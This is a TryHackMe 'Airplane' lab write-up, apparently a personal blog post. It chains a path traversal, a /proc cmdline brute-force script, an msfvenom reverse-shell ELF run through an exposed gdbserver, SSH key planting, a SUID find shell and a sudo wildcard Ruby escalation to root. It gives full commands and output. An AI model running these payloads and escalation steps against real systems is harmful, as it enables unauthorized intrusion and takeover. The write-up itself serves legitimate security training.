---
title: "TryHackMe - Airplane"
author: Nasrallah
description: ""
date: 2024-12-15 07:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, lfi, pathtraversal, directorytraversal, suid, sudo, ruby, bash]
img_path: /assets/img/tryhackme/airplane
image:
    path: airplane.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Airplane](https://tryhackme.com/r/room/airplane) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) is an interesting box where we exploit a path traversal to read the cmdline of a process running on a non-standard port to find it's gdb server, we exploit that to get foothold. A binary with suid is then found giving us access to another user that can run ruby script on root directory as root, a wild card is used on the sudo command so we exploit that to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.195.91                                                                        
Host is up (0.22s latency).                       
Not shown: 998 closed tcp ports (reset)                                                                  
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)                    
| ssh-hostkey:                                                                                           
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)                                      
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10 
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
```

We found two open ports, the first is 22 running openssh and 8000 running Werkzeug python web server, we can guess that the web application is flask.

### Web

The nmap scan showed a redirect to `airplane.thm`, so let's add that to `/etc/hsots` file and then navigate to the website.

![website](1.png)

We see that the website uses the page parameter to load `index.html`.

Let's test for directory traversal vulnerability.

![dt](2.png)

It worked and we managed to read the passwd file.

I tried reading the ssh private keys of the users but it didn't work.

Since this is a python application, we can read the environment variables of the process on the file `/proc/self/environ`.

![environ](3.png)

This gave us the location of where the application was run from which is `/home/hudson`.

We can guess that the application source code is at `/home/hudson/app.py` or so.

![source](4.png)

We found it at `/home/hudson/app/app.py`.

Nothing more to this app besides loading the files.

We can also try `/proc/self/cmdline` to see the command used to run the application.

```bash
curl http://airplane.thm:8000/?page=../../../../../proc/self/cmdline -o-
/usr/bin/python3app.py
```

Nothing interesting here.

Running nmap for all ports shows an extra open port.

```terminal
Host is up (0.30s latency).
Not shown: 63327 closed tcp ports (reset), 2205 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
6048/tcp open  x11
8000/tcp open  http-alt
```

I tried interacting with the port in different ways but I get nothing.

Let's use the path traversal to brute force the process PID cmdline and hopefully we can find something related to this port.

Use the following script to help with that.

```bash
#!/bin/bash

for i in $(seq 1 1000); do

    path="/proc/${i}/cmdline"

    response=$(curl -s http://airplane.thm:8000/?page=../../../..${path} -o- | tr '\000' ' ')
    if [[ -n "$response" && ! "$response" =~ "Page not found" ]]; then
        echo "${i}: ${response}"
    fi

done
```

>The original script was taken from an [0xdf writeup](https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html)

```terminal
[★]$ bash exploit.sh
1: /sbin/init splash
223: /lib/systemd/systemd-journald
263: /lib/systemd/systemd-udevd
293: /lib/systemd/systemd-networkd
300: /lib/systemd/systemd-timesyncd
307: /lib/systemd/systemd-resolved
309: /lib/systemd/systemd-timesyncd                                                                      
363: /usr/lib/accountsservice/accounts-daemon                                                            
368: /usr/sbin/acpid                                                                                     
371: avahi-daemon: running [airplane.local] 
373: /usr/sbin/cron -f                
375: /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
[...]
528: /usr/bin/gdbserver 0.0.0.0:6048 airplane 
531: /usr/bin/python3 app.py 
534: /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
535: /usr/sbin/ModemManager 
[....]
```

We found the process `/usr/bin/gdbserver 0.0.0.0:6048 airplane`.

It's running `gdbserver` on port 6048.

## **Foothold**

We can use the following [hacktricks page](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) to exploit the `gdbserver`. This technique uses a malicious elf that we upload to the gdbserver and then run it there.

First we create an elf binary.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.21.94.28 LPORT=443 PrependFork=true -f elf -o rev.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload                     
[-] No arch selected, selecting arch: x64 from the payload                                                                                                                                                         
No encoder specified, outputting raw payload                                                                                                                                                                       
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: rev.elf
```

Now we open the file locally using `gdb`

```terminal
[★]$ gdb -q rev.elf                             
Reading symbols from rev.elf...                     
(No debugging symbols found in rev.elf)                                                                  
(gdb)
```

Now we connect to the remote server on port 6048.

```terminal
(gdb) target extended-remote 10.10.151.120:6048
Remote debugging using 10.10.151.120:6048
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /usr/lib/debug/.build-id/7a/e2aaae1a0e5b262df913ee0885582d2e327982.debug from remote target...
Reading /usr/lib/debug/.build-id/7a/e2aaae1a0e5b262df913ee0885582d2e327982.debug from remote target...
Reading symbols from target:/usr/lib/debug/.build-id/7a/e2aaae1a0e5b262df913ee0885582d2e327982.debug...
Reading /usr/lib/debug/.build-id/e9/8c2a320466a026c0a0236da38a5156f9b8cb54.debug from remote target...
0x00007ffff7fd0100 in _start () from target:/lib64/ld-linux-x86-64.so.2
(gdb)
```

Now we upload the file.

```terminal
(gdb) remote put rev.elf /dev/shm/rev
Successfully sent file "rev.elf".
```

Now we setup our listener and run the file.

```terminal
(gdb) set remote exec-file /dev/shm/rev
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /dev/shm/rev from remote target...
Reading /dev/shm/rev from remote target...
Reading symbols from target:/dev/shm/rev...
(No debugging symbols found in target:/dev/shm/rev)
```

```terminal
[★]$ sudo nc -lvnp 443
[sudo] password for sirius: 
listening on [any] 443 ...
connect to [10.21.94.28] from (UNKNOWN) [10.10.151.120] 55882
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

## **Privilege Escalation**

### hudson -> carlos

Before continuing, I'll add my ssh public key to `hudson`'s authorized keys to get an ssh shell.

```terminal
cd .ssh                                                                                               
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrJW6y2ywVe98xsv7gmb+nEo4/4A8sJ6CYxymKTt9DojualEkttx6zI+GPtAqKNWU0TuETqBgRvYrcUXKrtOLpaPF+Q0v7bY3TWDc0fm7fkQT+PP5j5jDVKT/tF8X8pBqH/DQUXfe6HM4Fn810AowTLdrEfOnglMUnOSBs+
SekCJkO40CvoDJlOp1mZpHeChfkCb/QOavs9midUmVFLHH9vzmTelwvktuCOeVXzFWPDV6gzYB/qrM1a2amA3KNzeOOlr2Z7QC16xEYHuZHPZEY6kCJcWIe2ytClcGl7kYwaGdco41KhWmS8bNBzGDILIyfV3LqSGup6JT0cP6hetdLDzH10T1eQmW5CFbMOBKCpJTUCjPwyW7nDdTP
M9+qch7R3wcvvWaSTcWeE1jN+6fnIXjqDBWUDvV8772qUtZRq3g8OsgSrXcPO5y9wnrPpWTvW9b1Cr+JbZ/zsS5DsHya6tC9SdgoJOwAAjItsq6BXxgw8+VT6tbSTTXcDTHIvAc= sirius@parrot' > authorized_keys
```

Now I ran linpeas and found that `find` has `suid` bit.

```bash
-rwsr-xr-x 1 carlos carlos 313K Şub 18  2020 /usr/bin/find
```

Carlos is the owner of the file so we're getting a shell as carlos using the following command from [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid)

```bash
find . -exec /bin/sh -p \; -quit
```

```terminal
hudson@airplane:~$ find . -exec /bin/sh -p \; -quit
$ whoami
carlos
```

I switched back to hudson's session and copied the authorized_keys file to tmp then used suid exploit again to get carlos and copied the file on /tmp to carlos's .ssh directory to get an ssh shell as carlos.

```bash
$ exit
hudson@airplane:~$ cp .ssh/authorized_keys /tmp
hudson@airplane:~$ find . -exec /bin/sh -p \; -quit
$ cd /home/carlos
$ cd .ssh
$ cp /tmp/auth* .
```

This was the only way I was able to connect with an ssh key i don't know why.

### carlos -> root

Let's check our privileges now.

```terminal
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

We can ruby scripts located in root directory as root.

There is a wildcard there so we can just move from the root directory to anywhere we want.

I'll create a ruby script that runs `/bin/bash`

```ruby
system("/bin/bash")
```

```terminal
carlos@airplane:~$ echo 'system("/bin/bash")' > shell.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../home/carlos/shell.rb
root@airplane:/home/carlos# id
uid=0(root) gid=0(root) groups=0(root)
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://gtfobins.github.io/gtfobins/find/#suid>
